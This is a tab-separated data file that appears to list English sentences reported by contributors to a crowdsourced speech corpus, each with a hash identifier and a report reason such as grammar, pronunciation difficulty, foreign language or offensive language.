sentence	sentence_id	locale	reason
Shanahan was further rewarded by being named undisputed Hurler of the Year.	16a8f8033835c59e891f194917496f799267a175544ecdbf1fe07eb731b39afc	en	difficult-pronunciation
All of the Langenthal–St.	16d97076db146eecf1e880a48cc018195f9e8ee31ec70501712328ef5f6d41f4	en	difficult-pronunciation
Andy Socha and Dennis Miller were the team captains.	18ac94ab450da84e43635edc646866a156be93743426a9b694c28b974ffb86ff	en	difficult-pronunciation
Andy Socha and Dennis Miller were the team captains.	18ac94ab450da84e43635edc646866a156be93743426a9b694c28b974ffb86ff	en	last name Socha unknown pronounciation
It is located in the steppe some from the city of Kherson.	174fefdacdc54c699f5764c9243fde6c057424b0ef01ff19f68c833f60e63a09	en	grammar-or-spelling
It is located in the steppe some from the city of Kherson.	174fefdacdc54c699f5764c9243fde6c057424b0ef01ff19f68c833f60e63a09	en	difficult-pronunciation
It is located in the steppe some from the city of Kherson.	174fefdacdc54c699f5764c9243fde6c057424b0ef01ff19f68c833f60e63a09	en	1. grammar bad
It is located in the steppe some from the city of Kherson.	174fefdacdc54c699f5764c9243fde6c057424b0ef01ff19f68c833f60e63a09	en	 2. Kherson unknown pronounciation
May not reprsent all shows.	1b73a5e09db46acec463023b0f359d214f52e3bdccfabc2d08ec7fc52e929334	en	grammar-or-spelling
He first appeared in "Grand Slam Comics" Vol.	1af084e637c676ce332a25c8df4c79b2a79e6c10434f9512bfddae5107d144aa	en	grammar-or-spelling
Kare has studied at St Xaviers College in Mumbai.	1c0855540ff6fb0c9db77bfe9917454fb437f08a84571ead7e2b0cc3c7472af5	en	different-language
He was also highly involved in creating the University Botanic Garden (a teaching garden).	1c410af31de760257706557f06183fa62b84658a14cfdf9c36284509348e0e37	en	grammar-or-spelling
Some of his paintings were auctioned in Las Vegas (Nevada).	1bf0b7fa73590d7432cefe16e427bfb750217548173ee03419ced8917f6d7a3e	en	grammar-or-spelling
North West wss separated from South West of City Deanery.	1b4d797cc66b779d220d7388913de36e5812812576c444064baa38e350e5f085	en	grammar-or-spelling
Just judge us by whether we get it right.	1cb378a87d4c92d07d3963b6dd292a4a56305d5f7389c2c1cc5a5a6358255825	en	offensive-language
Asante Kotoko	1aaf0e49257e5601c38ae72b97f1470555eaa373ef0088d9c803a11fc93b985c	en	different-language
This changed of colour caused some mild controversy.	1d1a9611f358242f964f7eb32be89b1435159251d2712441cee46bb0a4d68274	en	grammar-or-spelling
Zafar and entered national politics.	1d3e7ae350a721e85d4d7cb20c27e8b752a4ccce7aada6029c818f4e238b4939	en	grammar-or-spelling
The upper floor had rooms rich with framing and carvings.	1d66d57f24536304445b27513f5ebf826f80ee9ef89828cea64b55cf7fcceddc	en	difficult-pronunciation
Eyes are elongate and deeply emarginate.	1d8f4e0b87a40d7ae7bafc1532d89e260118efe9e23bb2900a39d3298d3c6ff6	en	grammar-or-spelling
But our research was based on folklore and on what faeries were really like.	1d590e19860909560eef125d89248342992fcea766f652fa13bfb56867c42883	en	grammar-or-spelling
It is mentioned in mainly in the Story of King Banjar.	1dd1fd4585f775f8803556a0f110c418ec04477e52e0554886ff7afb34d32673	en	grammar-or-spelling
The Vikings were picked to finish in tenth place in both polls.	1dfde9209c2e5f4a16340a169f0f40525620a69489397bbcc8f96bbe3e1ee204	en	Line k
The most common rock in the Sierra Tejeda is limestone.	1d9dc16940367a22fefc2215c6acde24103a9d11718dc987a8a2ae313ac078dc	en	offensive-language
She studied at the of Moscow State University.	1f42434e73d6e135270d92940b9295938d811c9bcdc3677498cc3dc1e0de1f4d	en	grammar-or-spelling
The bronze scuplpture is placed on an granite pedestal.	1ec8f109fa41ec53a1580e3b60f788ef869ed22d212c91350ff951cfadc3a246	en	grammar-or-spelling
She rescued people who had been conned to be come servants in Arabia.	206d197ab781641cbefc0b1e2d20826349c5817de2448d7e1ec478093442029d	en	grammar-or-spelling
They followed the same route to the summit which earlier done by Odier.	20cc25ff800b7d59e0ea4ad4d4c8b1c4ecfde359a6c595d993b690fcfa56f7f6	en	grammar-or-spelling
He ask him to come to the village.	208e527a6ebc87e47e944de54dc5b353bbc8ee06edf87902184310d0de9a652b	en	grammar-or-spelling
Pilkington observed that these meetings always features alcohol consumption.	21568db226ec103cee672d20696a6700d48007ce65e170a726822dccdfd3bdd5	en	grammar-or-spelling
The leaves are around in diameter.	2152de465b87b3888fb257e439d6451780327514e3db9133eac5e3ce140da810	en	grammar-or-spelling
The organization struggled against the and the Social Order Law.	217ed341c172b0684dc2e89888109decd8a020e56eb924fb9965f1b34b2de881	en	grammar-or-spelling
Bronze medals was secured by Slovakia and host Germany.	216617ba75adc6d189181f18fd3827cd5fedaa693589f789d12b45ba29375cdb	en	grammar-or-spelling
He is directly responsible to carry out all duties that entrusted to him.	21d97f8f2df49b554fb2884315b60bbfdb5633634e625f55aeb77029f3b0e9f9	en	grammar-or-spelling
Traditionally security for the ministers have been provided by the Sri Lanka Police.	21e55d32675957ec7b8ed5a7d0cd56158652a3975c5402e768941eb5b601cc7c	en	grammar-or-spelling
It is located close to Hefei Xinqiao International Airport.	1f349ae3a0bf0d0b15b411282bff2e194bd14e9e93d2b66e315e5d5027e78953	en	difficult-pronounce
They are quite are scattered often appearing in clusters of two or three.	218cdde454d41bfeb211bbec853cd39d02a0724afb5bf9cb80aa2da78f1efed5	en	grammar-or-spelling
Elytra covered with coarse punctures.	21b61e7ed13141e871c1bf21e4968a86108de9f8f4d07db81c4330a632b552e4	en	grammar-or-spelling
Elytra covered with coarse punctures.	21b61e7ed13141e871c1bf21e4968a86108de9f8f4d07db81c4330a632b552e4	en	difficult-pronounce
The book debuted at no.	21ed1abf43b64f361d1298121b714c7712123686218ce6a6780469226192fc6d	en	grammar-or-spelling
They are quite are scattered often appearing in clusters of two or three.	218cdde454d41bfeb211bbec853cd39d02a0724afb5bf9cb80aa2da78f1efed5	en	grammar-or-spelling
He has two childrens Vivek and Divya Singla.	218b6781b745f54bf28fb23fcd8f357e3b58257a6dc6fabb4cdb62151aed646a	en	grammar-or-spelling
The song also charted on the Global Excl.	21ba1c588c40b1b263ec7923f51b739ff1911c6f030ad499ae87b3dbab05bcee	en	grammar-or-spelling
He spent three years at Swiss Re.	211f62bd43656277c944bf88e9cf93c2a9235d4c84173ab5f6f0aeeac4f50051	en	grammar-or-spelling
The tree has glabrous and branchlets.	227542f07cf4ff9f492d5e304d8f73d5e30bb9c0d8ffab56185c72f52ae15b42	en	difficult-pronounce
Crassula alpestris subsp.	229c3af61bfc6ea71ef331bef6a6ba40ffdaa47aed0c1f19f53a98be5d3f448b	en	different-language
The single topped the Global Excl.	231def1cf71ccc786318d7eab49c791099b19ef30628bda3d90d28ed3069baed	en	difficult-pronounce
Willer attended Mt.	20f3fad15a337f86ba69c9c52ba049af73d1f431f0e8a5c74a6ebd592ecc2b38	en	difficult-pronounce
The earliest parts of the church are the Norman tower dating from ca.	2267f8ebe6aae305873b23980623d0228569be1f474070780272200807dda068	en	grammar-or-spelling
During the rest the war he did not hold any relevant position.	22f881aa4ca35b37778af3abf3c6e612f7388e5f8c6cfea317ee12522251afeb	en	grammar-or-spelling
The tribe is by far the most species rich among Spilomelinae.	235b6ddc32fbfb517e304ce41f373c4db23de5f1157e114ae43a7c9337a03d3f	en	difficult-pronunciation
Willer attended Mt.	20f3fad15a337f86ba69c9c52ba049af73d1f431f0e8a5c74a6ebd592ecc2b38	en	grammar-or-spelling
Crassula alpestris subsp.	229c3af61bfc6ea71ef331bef6a6ba40ffdaa47aed0c1f19f53a98be5d3f448b	en	grammar-or-spelling
Crassula alpestris subsp.	229c3af61bfc6ea71ef331bef6a6ba40ffdaa47aed0c1f19f53a98be5d3f448b	en	different-language
John bare witness of Him.	235d33e6b2bea9f362c6eacd006d81091281f1853b52ee687e256ecb9a7c29a7	en	grammar-or-spelling
A hundred tons of prime butter was being produced by the factory each year.	21d6161ebc57138a870b5774c695df0b1acbe4e2e1c07978083ab8baeb934e53	en	animal exploitation
Noh Tek Mi!	235cbde6dcaf15c1fb976371702a9425afa60d811fa958cf5812e1fa92975b4d	en	different-language
The teams place first and second were directly qualified for the semi finals.	2370eb957f696c76d5c3e011479c78547038161f4b48f1e310dfa06f19d8ff3e	en	grammar-or-spelling
Guizhou Hengfeng	23e2ea9bf09f17d8fb3864f86d230aa3b08c8600eca9939716738fdd2c4f65af	en	different-language
Guizhou Hengfeng	23e2ea9bf09f17d8fb3864f86d230aa3b08c8600eca9939716738fdd2c4f65af	en	difficult-pronunciation
Tha.	233ce5498d5fc856d268cabe86a36fb0d8256067da306003a8cce33d01f98d11	en	grammar-or-spelling
Tha.	233ce5498d5fc856d268cabe86a36fb0d8256067da306003a8cce33d01f98d11	en	different-language
Yeddyurappa.	223ffeb3fb2874fd770bbb515430815868bdeb3b7e8a52ecd45fa51efb04f5aa	en	different-language
Yeddyurappa.	223ffeb3fb2874fd770bbb515430815868bdeb3b7e8a52ecd45fa51efb04f5aa	en	difficult-pronunciation
It was observed that it can survive in an environment without fresh oxygen (anoxia).	237652d728437c13a9340505225cb33d4399ce99d0d032a1b8ae1d5f16916531	en	grammar-or-spelling
International release by Paramount Television	23d980f1587f3d63035802392da30968d88e605b22d2f68e4e31015d449689e1	en	grammar-or-spelling
International release by Paramount Television	23d980f1587f3d63035802392da30968d88e605b22d2f68e4e31015d449689e1	en	.
Sundas worked in construction as the chair of Sundas Construction Pvt.	232db9d24df5c8bb2be1524834fc1a2416a73f4820ca302964fb923ecbf06fc3	en	grammar-or-spelling
You are not bigger that God.	235ab3403b1b75d88fa70f75c3481215dc4d69fed7b4cce1487a474816f21f0e	en	grammar-or-spelling
Noh Tek Mi!	235cbde6dcaf15c1fb976371702a9425afa60d811fa958cf5812e1fa92975b4d	en	different-language
Noh Tek Mi!	235cbde6dcaf15c1fb976371702a9425afa60d811fa958cf5812e1fa92975b4d	en	?
Guizhou Hengfeng	23e2ea9bf09f17d8fb3864f86d230aa3b08c8600eca9939716738fdd2c4f65af	en	grammar-or-spelling
Guizhou Hengfeng	23e2ea9bf09f17d8fb3864f86d230aa3b08c8600eca9939716738fdd2c4f65af	en	.
Noh Tek Mi!	235cbde6dcaf15c1fb976371702a9425afa60d811fa958cf5812e1fa92975b4d	en	different-language
Crassula alpestris subsp.	229c3af61bfc6ea71ef331bef6a6ba40ffdaa47aed0c1f19f53a98be5d3f448b	en	different-language
After several studies and the restoration process begins.	2485b189e62d726254165a7dfd110beec030f410ebf794584a33518e8eccabda	en	grammar-or-spelling
On the motion ""That the Right Hon.	24b67b2fb6e5df07fea00bdeab98b41c9ac9f2cbb81999fd75874fb30fae2318	en	grammar-or-spelling
Rosemont Stud remained in the ownership and also stand his sire Shamus Award.	25455fd60b975901b505defe2482224574b22157999c77b3077de5aca9200751	en	grammar-or-spelling
The department has used the term "cliques" when discussing these groups.	25978539b619067d92d70a7a46c83561ee6b112c286e64aeee53154ba67a8df4	en	offensive-language
The department has used the term "cliques" when discussing these groups.	25978539b619067d92d70a7a46c83561ee6b112c286e64aeee53154ba67a8df4	en	grammar-or-spelling
The department has used the term "cliques" when discussing these groups.	25978539b619067d92d70a7a46c83561ee6b112c286e64aeee53154ba67a8df4	en	different-language
The department has used the term "cliques" when discussing these groups.	25978539b619067d92d70a7a46c83561ee6b112c286e64aeee53154ba67a8df4	en	difficult-pronunciation
The department has used the term "cliques" when discussing these groups.	25978539b619067d92d70a7a46c83561ee6b112c286e64aeee53154ba67a8df4	en	pai
and born of the Virgin Mary.	2530f192131036dd8ecb7d7cc04c5e829aa35d727a55aee03874202c7947c7e5	en	grammar-or-spelling
The plant is owned and developed by Laughing Buddha Power Nepal Pvt.	255628bc786bcfc8a819ef9cd41c8bd06c1bec1504487f8c1745aa97b2a18dba	en	grammar-or-spelling
The initial estimated cost of the project was Rs.	246aa2483d902ae7b12821d1ed6e1ccda3efde0e235c30877e5643b892108477	en	grammar-or-spelling
All songs written by Craig Finn	25832015f91ef8525f3b5b3b169935d5f820f6ffc41e4792dccf995c274d4b3d	en	grammar-or-spelling
All songs written by Craig Finn	25832015f91ef8525f3b5b3b169935d5f820f6ffc41e4792dccf995c274d4b3d	en	.
uncover and bake fifteen minutes longer.	252815e5aa282a3321fbb63ffad28239fda4786d4e37a99a4b54d522435550f9	en	grammar-or-spelling
She performed "Feimin(n)" with Aron Can.	235b7d95184f702dd9ee9079d1f59df471cd6b1fa22d7e9fb91efac18ee852a8	en	grammar-or-spelling
All songs written by Craig Finn	25832015f91ef8525f3b5b3b169935d5f820f6ffc41e4792dccf995c274d4b3d	en	offensive-language
All songs written by Craig Finn	25832015f91ef8525f3b5b3b169935d5f820f6ffc41e4792dccf995c274d4b3d	en	grammar-or-spelling
She studied journalism at and political science at the University of Buenos Aires.	25ea96f0597246d455aad0b6e89875190198980575c7b6f15cd52925b1ebf597	en	grammar-or-spelling
It is known from skull and tooth material.	252e31afb91fa1d237ae4117393751e5ce81f98210d403c96c1027f2d7386285	en	offensive-language
It is known from skull and tooth material.	252e31afb91fa1d237ae4117393751e5ce81f98210d403c96c1027f2d7386285	en	different-language
The open roof is made of stained deal.	263f79d37ffaedd31f373a12035e8ba94a6f12a0c12545df918b4a616cd9c81d	en	grammar-or-spelling
Augusta is less than to the southwest.	25ea50fd30d5ac8401417f7e8b329efdbcfc11553fb2ddbeb2872b45e07d8e53	en	grammar-or-spelling
She creating the sound effects for the radio serial "Dick Barton".	2637a78588f7a3e9e4c7e5c64c515ea24b51826e59d4f3fd241b5bdeea3d6b07	en	grammar-or-spelling
Quotes of each figure are inscribed on the ground in front of them.	26411b79c5a7cdad395a4327c024845da350f0f6ff61aa5b47f84d82fbb10d0c	en	offensive-language
Quotes of each figure are inscribed on the ground in front of them.	26411b79c5a7cdad395a4327c024845da350f0f6ff61aa5b47f84d82fbb10d0c	en	grammar-or-spelling
Quotes of each figure are inscribed on the ground in front of them.	26411b79c5a7cdad395a4327c024845da350f0f6ff61aa5b47f84d82fbb10d0c	en	different-language
Quotes of each figure are inscribed on the ground in front of them.	26411b79c5a7cdad395a4327c024845da350f0f6ff61aa5b47f84d82fbb10d0c	en	difficult-pronounce
Iwasaki Projects Executive Eiji Karasawa has split from the Iwasaki Family and gone legitimate.	2695a3035ea0fe5c9482985327bfd569f0a1269bf42f5610cb4f107fbe90dec8	en	different-language
Iwasaki Projects Executive Eiji Karasawa has split from the Iwasaki Family and gone legitimate.	2695a3035ea0fe5c9482985327bfd569f0a1269bf42f5610cb4f107fbe90dec8	en	difficult-pronounce
She defended access to education and the emancipation of women in Argentina.	25f3e59be1f0e23551c889120c1c9907b881bda25219d91b1e1cd90981e69f8f	en	difficult-pronounce
Jy Ding started building the Hsu Yun Temple in the same year.	241e4d52d682bb6612d0c2e61c9663c121a2627c610b32b72097ca6d76cedbf9	en	difficult-pronounce
His doctoral research considered Agr nodes.	2555a846365e416846789953ab4cab6ffe126ec1cc016140059d93124100df6b	en	difficult-pronounce
It is the southernmost barangay of Malaybalay.	26ac8e7fdf0775b4c77a786e9e812192ba73d2c1e646c42e2921d3ce93404a31	en	difficult-pronounce
Carl (or Karl) was born in Vienna.	258a0e33b8e212d7f35dfb7f3a2ff2e2fdc6cb0db752f05cc70c572f66affb70	en	grammar-or-spelling
Carl (or Karl) was born in Vienna.	258a0e33b8e212d7f35dfb7f3a2ff2e2fdc6cb0db752f05cc70c572f66affb70	en	difficult-pronounce
Prothero.	25e2ba5e0a365671e1d3082b7416b1f2338cda7acf4a829ae0e4a1cbb4a72b3c	en	difficult-pronounce
Multiple people were taking into custody and at least one business was reported looted.	278384343697bb3c74737dccfdb3a9a33f05a0b0079bba3fc9909b21f5353044	en	grammar-or-spelling
It have always advocated an ascetic and rational consumption behavior.	27ddfb0b45657270fe4f5682f24e6570151ee149ed005617321f03912f8fdc51	en	grammar-or-spelling
Would did you mean by saying that?	28b9a6fb909ea858378b2f27e4b2e7593b252fd712700770dfa92cc0d2591b62	en	grammar-or-spelling
The pageant will be hosted by in his third consecutive year.	284f3e6946908e83aca1270f1e47ec7ef114da55ae0d7665caf011ce4025f202	en	grammar-or-spelling
That woke us all up.	28ec5ff6d44de72ed35cf215e1390f29c4fa0fe2d98090ffa1664b33221c240c	en	offensive-language
Francophone contes also exist outside of France.	297c95e36d99db3c2def48e0ef37424fa677299e7c0a44f5184c36cc1c58f671	en	difficult-pronounce
Bhima was the strongest of all in "Dvapara Yuga".	28433e5dcfbcf5e59575eace5c3e9a49a676cd7ae818dd757e7d7edde9c3ca4d	en	difficult-pronounce
Bhima was the strongest of all in "Dvapara Yuga".	28433e5dcfbcf5e59575eace5c3e9a49a676cd7ae818dd757e7d7edde9c3ca4d	en	different-language
His death became the headline in several newspapers affiliated to the Indonesian National Party.	295813fbbe2db8785e266e2ef1fff8a5999f324459ea88cf3344482fe8e1cdeb	en	grammar-or-spelling
She left Border Security Force and presently working as police constable in Punjab police.	290ac3c7f15921b2941ebdc4fcd24a27e14856165b9e4966de66e47b5b10c376	en	grammar-or-spelling
King Taksin later allowed the Mon people resettle their former villages.	2a84da43de7e1a74bf8eb75b1e9761edb62366a3c913711b3236a4cfcb13b650	en	grammar-or-spelling
His mother loses her both feet and he is sent to jail.	29d7d300683578074b84fe89e154c999e36b50cfdee07482fd184a279e762787	en	grammar-or-spelling
China boycotted the championships due to political tension with South Korea.	29da34075752cd146d1fc8880156b949a038bbb562bded98f45d88efcffd5b70	en	grammar-or-spelling
The squad numbers for the season was also revealed by the club.	2a06478e88b0528257a734cc8bbba8b77f53d173b4e339420870e8b979b6f7ab	en	grammar-or-spelling
The schedule of the competition will be as follows.	2ae153c5512bfff94c9a838c3b82bd63063d7caca625ecade67df54b623b399f	en	difficult-pronounce
Mayur decides to suicide but eventually did not attempt it.	2a19e82c15f32ccc3801016b4110a461d627379d089d522e5c603345164f4f06	en	grammar-or-spelling
He is further member of the Indian National Congress.	29b52f890186b0dcb33fb3caae0a94e095751818dc46dbdb9e96a2b05fc983f0	en	grammar-or-spelling
How much better can popular entertainment get than that?	2ab23dbf0eb06dddf4bd29cdb0d6e40289d26067b45e9452d4b00b04c2c76451	en	grammar-or-spelling
How much better can popular entertainment get than that?	2ab23dbf0eb06dddf4bd29cdb0d6e40289d26067b45e9452d4b00b04c2c76451	en	difficult-pronunciation
Provisions are shipped in by barge.	2d95f0542b8130c185da09f8e8de70819f222fa117f62c7bcec5ed47a21304b1	en	different-language
Other sources have used different divisions.	2ce744ce9bd323d357c4bc37fb889be24021ccbd3e8b3f2a814c8d7830a9da1e	en	offensive-language
The message of the runic cross is contested.	2d9641014c876d7fbb39486a0b1995c21274287b246c66855b18781cc48af23a	en	Good
Five days later Velikiye Luki was finally liberated.	2d3c15acdff4cb1b969a887f62590c5f9f132b90cd01ac05373e082edce7d124	en	difficult-pronunciation
He was confirmed in the post by the Grand Duke himself.	2d6191d68213e4847db45139f3ec29a241000e4bd6bd112d12243bb42e15573c	en	different-language
He was confirmed in the post by the Grand Duke himself.	2d6191d68213e4847db45139f3ec29a241000e4bd6bd112d12243bb42e15573c	en	offensive-language
He was confirmed in the post by the Grand Duke himself.	2d6191d68213e4847db45139f3ec29a241000e4bd6bd112d12243bb42e15573c	en	grammar-or-spelling
He was confirmed in the post by the Grand Duke himself.	2d6191d68213e4847db45139f3ec29a241000e4bd6bd112d12243bb42e15573c	en	difficult-pronounce
He was confirmed in the post by the Grand Duke himself.	2d6191d68213e4847db45139f3ec29a241000e4bd6bd112d12243bb42e15573c	en	dl9860
delilahlove511c50/1
Senators.	2e06aea8e06a37ae8b810b46aef12fd99531d81c25299c3eaf8314a641796635	en	offensive-language
The engagement lasted three hour.	2eed767b87fbe0fe88835a012c1d4890f5ffcc2f86c20f53775f42f06be47cf8	en	grammar-or-spelling
Each members of the club awaken their mysterious powers.	2ded68abcf4bff1681a86a5d3f2016c99836733e5ab01480e8190a74ce45b274	en	grammar-or-spelling
Best eight athletes from preliminary round qualifies to the semifinal.	2d6bb4509219ecb394c66985e0581d88af7c24430da4378115983c31b2ec6798	en	grammar-or-spelling
Further changes was made after the end of the Middle Ages.	2dff8b4ff08bb1faf53b88d85628044c7cd391d114814a53890c16d9c8f34531	en	grammar-or-spelling
She was eliminated in her first match by Andrea Olaya of Colombia.	2f3988281e2aa579c53fdf82077837845342af6a0abb6ee0e6d89bcc1baeaa28	en	offensive-language
Kawasumi also enjoyed voicing her character across thee series.	2fa3547abb96285a8510ebf1a10018ad3bf4028b04cb470a4f039b48f7b13593	en	grammar-or-spelling
Haroshi’s art studio in located in the outskirts of Tokyo.	2fd30e80471f5b0c36c2bc8abc544fe0938595232cfba37b81a85fbcaad703c6	en	grammar-or-spelling
Finally king saw this and ordered to worship in Tamil regularly.	2ea8504d278d747c9a0a64366ca456ebd8ba3970db1146b693e1f43bdda6ad8d	en	grammar-or-spelling
Heward Avenue in Toronto named for him.	2f3acff6926b09b8e1d8211f68b10f001fcc19069a8f9d265ed3d8ad7ac00ac4	en	grammar-or-spelling
Plante found it especially strange since "Rick and Morty" is "fucked up".	302ac3eac2b25dd21a0460c87a29d0a08a36b0e5c929ab01871cad90630c953e	en	offensive-language
The adults of this species is on the wing from November to April.	30a82c670b15419b2943f1cf7f414fa9cc3a9ab2b4eceecd3745132633f4462f	en	grammar-or-spelling
The winners of the African qualification will qualified for the Thomas Cup.	3088a2e84bc227c24775267669795b88a4faa8c892c4b7c46bf9c9b697a4176c	en	grammar-or-spelling
The winners of the African qualification will qualified for the Thomas Cup.	3088a2e84bc227c24775267669795b88a4faa8c892c4b7c46bf9c9b697a4176c	en	grammar-or-spelling
He served as Minister in at various point of time.	305a9bede8ad38514909c2f3f02e25e8f6032d580178a23322deb5756d5e3e4c	en	grammar-or-spelling
Additional investigation of the cause(s) is needed.	3027abe7ffa277b88abcdd5dd286edf6f1e00a36789984e4b68b5b211a6baad4	en	grammar-or-spelling
Authority control	30eb9b521a1447ebdfd8eeb80132101988d5062e936d412fd0a9a8b4849e217d	en	grammar-or-spelling
Authority control	30eb9b521a1447ebdfd8eeb80132101988d5062e936d412fd0a9a8b4849e217d	en	.
Interim or acting athletic director	3115cd2d068263c8ff29f5ebeb5ae2423c9fe35b3abfb64a0853edf0a900588a	en	grammar-or-spelling
Interim or acting athletic director	3115cd2d068263c8ff29f5ebeb5ae2423c9fe35b3abfb64a0853edf0a900588a	en	.
She identified that the herbicide atrazine can activate gene networks.	3108368127f98c929525e6c5dbff16e3e3a86574669f151e1c19017516226567	en	different-language
Florence Stacpoole was the daughter of Rev.	3164a955d69e27962a2f51fa7f5bf60ca391ce57af4c43c2a9b2bf2619d2dc05	en	grammar-or-spelling
Legia Warsaw	31db4c28f65da5ebed32535c2ff9df34cc26195153a4945e97b7fd66671f68c8	en	grammar-or-spelling
Legia Warsaw	31db4c28f65da5ebed32535c2ff9df34cc26195153a4945e97b7fd66671f68c8	en	.
He also remained the President of Shiromani Akali Dal.	32078b52bac9fcf878c926bf6adca4709d31a5ae9b427d1e8f1512d426166879	en	grammar-or-spelling
He also remained the President of Shiromani Akali Dal.	32078b52bac9fcf878c926bf6adca4709d31a5ae9b427d1e8f1512d426166879	en	different-language
He also remained the President of Shiromani Akali Dal.	32078b52bac9fcf878c926bf6adca4709d31a5ae9b427d1e8f1512d426166879	en	Report all
Scott would take the song and would remix it would guitar and overdubs.	32187a60206eeb1d0d0259cb11e139bae27887c7714680d7f42ce081fa61adac	en	grammar-or-spelling
She was raped by her uncle.	33311288f22429b676263ba4d65eb88c49fd4133a46e4691a93b76c7171035bb	en	offensive-language
Scott would take the song and would remix it would guitar and overdubs.	32187a60206eeb1d0d0259cb11e139bae27887c7714680d7f42ce081fa61adac	en	grammar-or-spelling
Scott would take the song and would remix it would guitar and overdubs.	32187a60206eeb1d0d0259cb11e139bae27887c7714680d7f42ce081fa61adac	en	difficult-pronounce
William Mullen was the fourth of six children born Melvin and Margaret Mullen.	333dc22df26064454463e00c62f925b4010188bf504333f3f7cc2820aab35139	en	grammar-or-spelling
Lloyd at their premises in New York.	31bc4f02db5f6105e44d5513846baefd10842844676a590279d36af3fca45a30	en	Seems to have a part missing in the beginning.
The new church was to be erected in memory of Rev.	33c9ff7aac2a864b5af8d5f84d39ead0fa0f281f6b1efac23a29512531b7681f	en	grammar-or-spelling
They club are affiliated to the Gwent County Football Association.	31dad98344db437c1d4a1ef3a83ddacbfa9cb7fc5b7c9cecbf18d34852a91f88	en	grammar-or-spelling
Sun started training wushu at the sage of six.	33fa441814a244ce279f101d0989a33b8b5bb67fc4f355808aba9ea90dd422b6	en	grammar-or-spelling
The aerodynamics of the prototype allow it to get up to of downforce.	331837234eef5cad0d86c3dca477ae9a25c1e8e8f8382eaa880e4537ca0cf488	en	grammar-or-spelling
Scott would take the song and would remix it would guitar and overdubs.	32187a60206eeb1d0d0259cb11e139bae27887c7714680d7f42ce081fa61adac	en	grammar-or-spelling
He has supported airborne spread as an importance mechanism for the disease.	33ab692c89ea2cc20d92b17347d567bd11ea4b3e1bd1c72d06c0a19b64ade536	en	grammar-or-spelling
For nine years she was artist in residence at Metropolitan State University of Denver.	33685b68b08c41d9f17a19b75bc8dba8a3b5b19431ded15dedbceb3e0159c247	en	offensive-language
For nine years she was artist in residence at Metropolitan State University of Denver.	33685b68b08c41d9f17a19b75bc8dba8a3b5b19431ded15dedbceb3e0159c247	en	different-language
For nine years she was artist in residence at Metropolitan State University of Denver.	33685b68b08c41d9f17a19b75bc8dba8a3b5b19431ded15dedbceb3e0159c247	en	difficult-pronounce
These went also went to the stewards to resolve.	3444bf902f6d8e5bf5127a9d4fe3d0f2680e99f885e32f51b2905a4022b5f7e3	en	grammar-or-spelling
She is the former director of the Spelman College Museum of Fine Art.	32fdc267c29baeb1c224868bfb3a516d74dc52a437db5163688ead462420e774	en	offensive-language
She is the former director of the Spelman College Museum of Fine Art.	32fdc267c29baeb1c224868bfb3a516d74dc52a437db5163688ead462420e774	en	grammar-or-spelling
She is the former director of the Spelman College Museum of Fine Art.	32fdc267c29baeb1c224868bfb3a516d74dc52a437db5163688ead462420e774	en	different-language
She is the former director of the Spelman College Museum of Fine Art.	32fdc267c29baeb1c224868bfb3a516d74dc52a437db5163688ead462420e774	en	difficult-pronounce
She is the former director of the Spelman College Museum of Fine Art.	32fdc267c29baeb1c224868bfb3a516d74dc52a437db5163688ead462420e774	en	thank you
The rails were each long.	3498a69f7c3da9d623156c352301e6dd55ee34977239e54b0dbb0d4a8472a710	en	grammar-or-spelling
The Italian team team won eight events in this edition.	33dfdf28ab3c9c65d97ccff9cde6e0b1bde27021b7f8fd7cf8a19776eccbab48	en	grammar-or-spelling
Chickens were killed and stripped of their feathers as well.	34cddaa74a81ccef6e55c57159578f8540f7493ae8e0746dd71efa7285399486	en	difficult-pronunciation
Its administrative centre was Mogilev.	347ef110be1e18e6e4adc92f9be329cd6ea0578e16a0de98d0135fc559caee5b	en	different-language
She taught while continuing her corporate career.	34fd762842012193518c6aced2f90d5a7a4b852977630dddf142d0d3f28745ca	en	hhgf
She was laid to rest in the St Pancras and Islington Cemetery.	34b0771534963c33d5c3c24add1b03a73e9d81cf7bfd745c3b6990280014ce9a	en	grammar-or-spelling
He had reached the third camp of Mt.	346c4b0dba9e523a9d9b201ae49086bab00bacd4ea793fb69a243cadde3eb493	en	grammar-or-spelling
The village has higher secondary school	34fed2fe3f0a3153b5057e0a114751ee8f7ce4a4c8741b103ae30b6596e0663e	en	grammar-or-spelling
The village has higher secondary school	34fed2fe3f0a3153b5057e0a114751ee8f7ce4a4c8741b103ae30b6596e0663e	en	.
He studied at Mount St Joseph School.	3482e0fec1c715a45f133237ba880a143425abbd5cc893bde841a85f4e58b341	en	grammar-or-spelling
